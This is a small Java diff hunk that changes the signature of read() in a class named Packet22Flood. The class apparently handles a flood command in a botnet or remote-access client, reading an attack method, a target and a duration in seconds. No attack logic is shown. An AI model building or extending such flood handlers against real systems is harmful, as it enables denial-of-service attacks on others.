@@ -14,7 +14,7 @@ public class Packet22Flood extends AbstractIncomingPacket {
 	public static final int THREADS = 5;
 
 	@Override
-	public void read() throws Exception {
+	public void read(Connection con) throws Exception {
 		int method = Connection.instance.readInt();
 		String target = Connection.instance.readLine();
 		int seconds = Connection.instance.readInt();
